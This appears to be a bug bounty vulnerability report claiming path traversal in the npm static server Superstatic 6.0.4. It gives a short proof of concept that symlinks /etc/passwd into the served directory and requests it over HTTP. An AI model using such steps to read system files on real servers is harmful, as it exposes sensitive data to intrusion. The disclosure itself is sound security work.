# Description

I would like to report path traversal vulnerability in Superstatic module
It allows an attacker to read system files via path traversal vulnerability

# Module
module name: Superstatic
version: 6.0.4
npm page: https://www.npmjs.com/package/superstatic

Module Description

Superstatic is an enhanced static web server that was built to power. It has fantastic support for HTML5 pushState applications, clean URLs, caching, and many other goodies.
By default, Superstatic will simply serve the current directory

# Weekly Downloads

335,788

# Vulnerability Description

With a symbolically linked file in the working directory, it is possible to read arbitrary files outside of the web root directory.


# POC

1)Install the Superstatic module
$ npm install -g superstatic

2)Make a directory
$ mkdir test

3)Go to 'test' directory
$ cd test

4)create a symlink file
ln -s /etc/passwd 'filename'

5)Run Superstatic module
$ Superstatic

6)Request the file within browser
http://localhost:3474/'filename'

# References

These are similar reports
https://hackerone.com/reports/510043
https://hackerone.com/reports/695416


# Impact
This could have enabled an attacker to view system files and leverage attacks like remote code execution and so on
